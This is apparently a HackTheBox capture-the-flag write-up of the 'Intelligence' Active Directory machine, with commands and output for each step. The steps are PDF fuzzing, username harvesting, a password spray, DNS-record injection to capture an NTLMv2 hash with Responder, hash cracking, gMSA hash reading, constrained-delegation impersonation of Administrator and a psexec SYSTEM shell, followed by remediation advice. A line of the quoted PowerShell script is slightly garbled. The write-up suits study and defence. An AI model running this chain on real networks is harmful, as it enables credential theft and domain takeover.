# HackTheBox — Intelligence (Medium, Active Directory / Windows)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`
**Domain:** `intelligence.htb`
**Domain Controller:** `DC.intelligence.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-22 06:03 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.41s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-22 13:04:15Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-22T13:05:03
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.60 seconds
```

Standard Active Directory domain controller footprint (domain: `intelligence.htb`, hostname: `DC`), running Windows Server 2019. Notably, **WinRM (5985/5986) and RDP (3389) are absent** — remote access will need to come via another route. The ~7-hour clock skew is noted for later Kerberos operations.

### 1.2 SMB Guest Probe

```bash
nxc smb 10.129.xx.xx -u guest -p ''
```
```
SMB         10.129.xx.xx   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.xx.xx   445    DC               [-] intelligence.htb\guest: STATUS_ACCOUNT_DISABLED
```

Guest access disabled. No unauthenticated SMB.

### 1.3 /etc/hosts Configuration

```bash
cat /etc/hosts
```
```
10.129.xx.xx   intelligence.htb DC.intelligence.htb DC
```

---

## 2. PDF Document Enumeration — Username and Password Discovery

### 2.1 Identifying the Document Naming Pattern

The `intelligence.htb` website exposes a document directory at `/documents/`. Visible PDFs follow a strict naming convention: `YYYY-MM-DD-upload.pdf`. This suggests there may be many more documents accessible by guessing dates.

### 2.2 Generating a Date Wordlist

```python
cat date.py
```

```python
from datetime import datetime, timedelta

start_date = datetime(2020, 1, 1)
end_date = datetime(2020, 12, 30)

current_date = start_date
with open("dates.txt", "w") as f:
    while current_date <= end_date:
        f.write(current_date.strftime("%Y-%m-%d") + "\n")
        current_date += timedelta(days=1)

print("Wordlist 'dates.txt' generated successfully.")
```

```bash
head dates.txt
```
```
2020-01-01
2020-01-02
2020-01-03
2020-01-04
2020-01-05
2020-01-06
2020-01-07
2020-01-08
2020-01-09
2020-01-10
```

### 2.3 Fuzzing for Valid PDFs

```bash
ffuf -w dates.txt -u http://intelligence.htb/documents/FUZZ-upload.pdf -mc 200
```

```
2020-01-23              [Status: 200, Size: 11557, ...]
2020-01-20              [Status: 200, Size: 11632, ...]
2020-02-17              [Status: 200, Size: 11228, ...]
2020-01-10              [Status: 200, Size: 26400, ...]
2020-01-04              [Status: 200, Size: 27522, ...]
2020-01-30              [Status: 200, Size: 26706, ...]
2020-01-01              [Status: 200, Size: 26835, ...]
2020-02-28              [Status: 200, Size: 11543, ...]
...
```

Dozens of valid PDFs are found spanning the full year.

### 2.4 Bulk Downloading All PDFs

```bash
ffuf -w ../dates.txt -u http://intelligence.htb/documents/FUZZ-upload.pdf -mc 200 -s \
  | awk '{print "http://intelligence.htb/documents/"$1"-upload.pdf"}' \
  | xargs -n 1 wget
```

All matching PDFs are downloaded to the working directory.

### 2.5 Extracting Usernames from PDF Metadata

PDF creator metadata often contains the author's name. Extracting it from all downloaded files:

```bash
exiftool 2020-01-01-upload.pdf
```
```
...
Creator                         : William.Lee
```

Looping over all PDFs to collect unique usernames:

```bash
exiftool -Creator *.pdf | awk -F': ' '{print $2}' | sort -u > usernames.txt
```

```bash
head usernames.txt
```
```
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
```

A list of AD-format usernames (`Firstname.Lastname`) is assembled from the metadata.

### 2.6 Discovering a Default Password in PDF Content

Reading through the downloaded PDFs reveals two notable documents:

**`2020-12-30-upload.pdf`** (Internal IT Update):
```
Internal IT Update

There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

This hints at a web-monitoring script by someone named "Ted," relevant later.

**`2020-06-04-upload.pdf`** (New Account Guide):
```
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

A **default password** for new accounts is disclosed in plaintext in a publicly accessible PDF.

---

## 3. Initial Access — Password Spray

```bash
nxc smb 10.129.xx.xx -u usernames.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
```

```
SMB         10.129.xx.xx   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 ...
SMB         10.129.xx.xx   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.xx.xx   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
...
SMB         10.129.xx.xx   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
...
```

One account, `Tiffany.Molina`, never changed the default password and authenticates successfully.

---

## 4. SMB Enumeration as Tiffany.Molina

### 4.1 Checking Share Permissions

```bash
nxc smb 10.129.xx.xx -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
```

```
SMB         10.129.xx.xx   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.xx.xx   445    DC               [*] Enumerated shares
SMB         10.129.xx.xx   445    DC               Share           Permissions     Remark
SMB         10.129.xx.xx   445    DC               -----           -----------     ------
SMB         10.129.xx.xx   445    DC               ADMIN$                          Remote Admin
SMB         10.129.xx.xx   445    DC               C$                              Default share
SMB         10.129.xx.xx   445    DC               IPC$            READ            Remote IPC
SMB         10.129.xx.xx   445    DC               IT              READ
SMB         10.129.xx.xx   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.xx.xx   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.xx.xx   445    DC               Users           READ
```

### 4.2 Retrieving the User Flag

```bash
impacket-smbclient Tiffany.Molina@10.129.xx.xx
```
```
# use Users
# cd Tiffany.Molina/Desktop
# cat user.txt
```
```
<REDACTED_USER_FLAG>
```

### 4.3 Discovering the IT Share

```bash
# use IT
# ls
```
```
-rw-rw-rw-       1046  Mon Apr 19 00:50:58 2021 downdetector.ps1
```

```bash
# cat downdetector.ps1
```

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves Ted.Graves@intelligence.htb' -To 'Ted Graves Ted.Graves@intelligence.htb' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This is the "Ted" script mentioned in the earlier PDF. It runs on a **5-minute schedule** as `Ted.Graves`. The script:

1. Queries the AD DNS zone for any record whose name **starts with `web`**.
2. Makes an HTTP request to that hostname using **`-UseDefaultCredentials`** — meaning the request carries the running user's (`Ted.Graves`'s) NTLM credentials automatically.
3. If the server returns non-200, sends an alert email.

This is exploitable: if we can add a DNS record named `web<anything>` pointing to our attacker machine, the scheduled script will authenticate to us with `Ted.Graves`'s NTLM hash.

---

## 5. Lateral Movement — DNS Record Injection + NTLM Capture

### 5.1 Checking DNS Write Permissions

```bash
bloodyad -H 10.129.xx.xx -d intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' get writable
```

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=intelligence,DC=htb
permission: WRITE

distinguishedName: CN=Tiffany Molina,CN=Users,DC=intelligence,DC=htb
permission: WRITE

distinguishedName: DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.intelligence.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=intelligence,DC=htb
permission: CREATE_CHILD
```

`Tiffany.Molina` has **`CREATE_CHILD`** on the `DomainDnsZones` DNS partition — she can add new DNS records to the `intelligence.htb` zone.

### 5.2 Adding a Malicious DNS Record

```bash
python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' \
  -a add -r website -t A -d 10.10.xx.xx 10.129.xx.xx
```
```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

A DNS A record named `website` (matching the `web*` pattern) is added, pointing at the attacker's machine. Within the next scheduled run (~5 minutes), `downdetector.ps1` will query `http://website.intelligence.htb`, resolving to us.

### 5.3 Starting Responder to Capture the Hash

```bash
sudo responder -I tun0
```

```
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
...
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.xx.xx]
...
[+] Listening for events...
```

(BloodHound collection runs concurrently while waiting for the next scheduled execution.)

### 5.4 Capturing Ted.Graves' Hash

When the script triggers:

```
[HTTP] NTLMv2 Client   : 10.129.xx.xx
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:<REDACTED_CHALLENGE>:<REDACTED_RESPONSE>:<REDACTED_BLOB>
```

`Ted.Graves`'s NTLMv2 hash is captured via the `Invoke-WebRequest -UseDefaultCredentials` call.

### 5.5 Cracking the Hash

```bash
john hash -wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED_PASSWORD>         (Ted.Graves)
1g 0:00:00:05 DONE (2026-06-22 06:59) 0.1923g/s 2079Kp/s 2079Kc/s
Session completed.
```

---

## 6. Active Directory Enumeration — BloodHound

BloodHound collection (run during the Responder wait period) reveals the following attack path:

```
Ted.Graves
  ↓ [MemberOf]
ITSupport (Group)
  ↓ [ReadGMSAPassword]
svc_int$ (Group Managed Service Account)
  ↓ [AllowedToDelegate → WWW/dc.intelligence.htb]
DC.INTELLIGENCE.HTB
```

The chain:
1. `Ted.Graves` is a member of the **`ITSupport`** group.
2. `ITSupport` has the **`ReadGMSAPassword`** right over `svc_int$` — meaning group members can read the gMSA's current auto-managed password.
3. `svc_int$` is configured for **Constrained Delegation** to the SPN `WWW/dc.intelligence.htb` — enabling impersonation of any user (including `Administrator`) to that specific service.

---

## 7. Privilege Escalation — GMSA Password Read + Constrained Delegation Abuse

### 7.1 Reading the GMSA Password

```bash
nxc ldap 10.129.xx.xx -u Ted.Graves -p '<REDACTED_PASSWORD>' --gmsa
```

```
LDAP        10.129.xx.xx   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.xx.xx   389    DC               [+] intelligence.htb\Ted.Graves:<REDACTED_PASSWORD>
LDAP        10.129.xx.xx   389    DC               [*] Getting GMSA Passwords
LDAP        10.129.xx.xx   389    DC               Account: svc_int$             NTLM: <REDACTED_NTLM_HASH>     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```

The NT hash for `svc_int$` is recovered. Since it's a gMSA, there's no crackable password — we work directly with the NTLM hash for authentication.

### 7.2 Confirming the Delegation SPN

An initial delegation attempt with `cifs/dc.intelligence.htb` fails with `KDC_ERR_BADOPTION`, indicating the SPN isn't in the delegation list. Checking the actual configured value:

```bash
bloodyad -H 10.129.xx.xx -d intelligence.htb -u 'svc_int$' \
  -p 'aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH>' \
  get object 'svc_int$' --attr msDS-AllowedToDelegateTo
```

```
distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
```

The constrained delegation is to `WWW/dc.intelligence.htb` — not `cifs`. Using the correct SPN is essential.

### 7.3 Synchronising the Clock for Kerberos

The ~7-hour clock skew must be corrected before requesting Kerberos tickets:

```bash
sudo ntpdate 10.129.xx.xx
```
```
2026-06-22 14:03:00.437394 (+0000) +25200.261594 +/- 0.149761 10.129.xx.xx s1 no-leap
CLOCK: time stepped by 25200.261594
```

### 7.4 Requesting a Service Ticket Impersonating Administrator (S4U2Proxy)

```bash
impacket-getST \
  -dc-ip 10.129.xx.xx \
  -hashes aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH> \
  -spn WWW/dc.intelligence.htb \
  'intelligence.htb/svc_int$' \
  -impersonate Administrator
```

```
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Using the S4U2Self + S4U2Proxy extension, a service ticket is obtained for `Administrator` to the `WWW/dc.intelligence.htb` service — carrying Administrator-level privileges, signed and valid.

### 7.5 Setting the Ticket Cache

```bash
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

---

## 8. Domain Compromise — psexec as SYSTEM

```bash
impacket-psexec -k -no-pass dc.intelligence.htb
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file awcJHVCs.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service sdjU on dc.intelligence.htb.....
[*] Starting service sdjU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

`psexec` authenticates using the Kerberos `WWW/` ticket via the `ADMIN$` share and creates a service, achieving a SYSTEM shell on the domain controller.

### 8.1 Root Flag

```
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 9. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified AD DC (no WinRM/RDP), IIS on port 80, domain `intelligence.htb` |
| 2 | Identified `YYYY-MM-DD-upload.pdf` naming pattern on the web server | Found predictable PDF URL structure to fuzz |
| 3 | Generated year-2020 date wordlist; ffuf fuzzing of `/documents/FUZZ-upload.pdf` | Discovered and bulk-downloaded ~80 PDFs |
| 4 | `exiftool -Creator *.pdf` metadata extraction | Harvested list of domain usernames in `Firstname.Lastname` format |
| 5 | Read `2020-06-04-upload.pdf` content | Found plaintext default password `NewIntelligenceCorpUser9876` in a New Account Guide |
| 6 | Password spray with nxc | `Tiffany.Molina` confirmed as using the default password |
| 7 | SMB share enumeration as `Tiffany.Molina` | Read user flag from `Users\Tiffany.Molina\Desktop`; found `IT\downdetector.ps1` |
| 8 | Analysed `downdetector.ps1` | Script runs every 5 min as `Ted.Graves`, fetching `web*` DNS hostnames with `UseDefaultCredentials` |
| 9 | `bloodyad get writable` → confirmed `Tiffany.Molina` has `CREATE_CHILD` on the DNS zone | DNS record injection path confirmed |
| 10 | Added `website` A record pointing to attacker via `dnstool.py`; started Responder | Within 5 minutes, `downdetector.ps1` sent `Ted.Graves`' NTLMv2 hash to our Responder HTTP server |
| 11 | John the Ripper cracked Ted.Graves' NTLMv2 hash | Plaintext password recovered |
| 12 | BloodHound: `Ted.Graves` → `ITSupport` → `ReadGMSAPassword` on `svc_int$` → constrained delegation to `WWW/dc.intelligence.htb` | Full attack path to DA identified |
| 13 | `nxc --gmsa` read the gMSA NT hash for `svc_int$` | Hash-based impersonation of the service account |
| 14 | Verified constrained delegation SPN with bloodyAD (`WWW/dc.intelligence.htb`) | Corrected initial wrong-SPN failure |
| 15 | `ntpdate` to synchronise clock; `impacket-getST` with S4U2Proxy | Obtained a Kerberos service ticket impersonating `Administrator` to `WWW/dc.intelligence.htb` |
| 16 | `impacket-psexec -k -no-pass` using the Administrator ccache | SYSTEM shell on the DC; root flag captured |

---

## 10. Tools Used

- `nmap` — port/service scanning
- `nxc` (NetExec) — SMB auth/share enumeration, password spray, GMSA password retrieval
- Python 3 (`date.py`) — generating the date-based wordlist
- `ffuf` — PDF URL fuzzing
- `wget` / `xargs` — bulk PDF download
- `exiftool` — PDF metadata username extraction
- `impacket-smbclient` — SMB share browsing and file retrieval
- `bloodyAD` — AD ACL enumeration, DNS zone write permission identification, delegation SPN lookup
- `dnstool.py` (Krbrelayx toolkit) — adding DNS A records via LDAP
- `Responder` — NTLMv2 hash capture from `Invoke-WebRequest -UseDefaultCredentials`
- `John the Ripper` — offline NTLMv2 hash cracking
- `bloodhound-python` — AD enumeration for attack path analysis
- `ntpdate` — Kerberos clock synchronisation
- `impacket-getST` — S4U2Self/S4U2Proxy constrained delegation ticket request
- `impacket-psexec` — Kerberos-authenticated remote SYSTEM shell

---

## 11. Key Takeaways / Remediation

1. **Sensitive Information in Publicly Accessible Documents:** A default password was embedded in a PDF on the public web server, and domain usernames were recoverable from PDF metadata. Internal documents, especially those containing credentials or user account information, must never be placed on publicly accessible servers. PDF metadata (author, creator fields) should be stripped before publication.
2. **Predictable Resource Naming Enabling Enumeration:** The `YYYY-MM-DD-upload.pdf` naming pattern allowed systematic discovery of all internal documents via date-based fuzzing. Documents should not be served with guessable, enumerable filenames — either require authentication to access or use unguessable identifiers (UUIDs).
3. **Default Passwords Never Changed:** `Tiffany.Molina` was using the default password months/years after account creation. Default passwords should have a forced-change policy enforced at first login, and accounts that have not changed their default password should be automatically disabled or flagged. A fine-grained password policy requiring a change within the first logon would prevent this class of finding entirely.
4. **`-UseDefaultCredentials` in Scheduled Scripts Fetching Attacker-Controlled URLs:** `downdetector.ps1` queried AD DNS for hostnames to check, then made authenticated HTTP requests to each. Since any user with DNS CREATE_CHILD access could add entries matching `web*`, an attacker can coerce NTLM authentication to an arbitrary host. Scheduled scripts that make outbound HTTP requests should never use Windows integrated authentication (`-UseDefaultCredentials`) — use an application-level token or no credentials if monitoring external services. Additionally, the script should maintain a hardcoded allowlist of monitored hosts rather than dynamically pulling from DNS.
5. **Overly Permissive DNS Zone Permissions:** Standard domain users (like `Tiffany.Molina`) could create new DNS records. DNS zone write access should be restricted to administrators and DNS management roles. The `Authenticated Users` or general user group should not have `CREATE_CHILD` on DNS application partitions.
6. **Constrained Delegation Enabling Cross-Service Impersonation:** The `svc_int$` gMSA was permitted to delegate to `WWW/dc.intelligence.htb`, enabling any principal who could authenticate as `svc_int$` to impersonate any user — including `Administrator` — to that service, which was then usable with `psexec`. Constrained delegation should be granted only where strictly necessary, scoped to the minimum required SPNs, and should target services that don't grant broad host access (like `cifs`/`ADMIN$`). The `Protected Users` group membership for sensitive accounts prevents them from being impersonated via delegation.
7. **GMSA Password Readable by a Broad Group:** The `ITSupport` group having `ReadGMSAPassword` over `svc_int$` meant that any account in IT support — compromised via even a simple password spray — provided a path to read the gMSA hash. gMSA `PrincipalsAllowedToRetrieveManagedPassword` should be restricted to only the specific accounts/services that genuinely need to authenticate as the gMSA, not a broad support group.

---

*Flags and sensitive values (passwords, hashes, NTLM challenges) have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for target, `10.10.xx.xx` for attacker/VPN) per the established convention.*
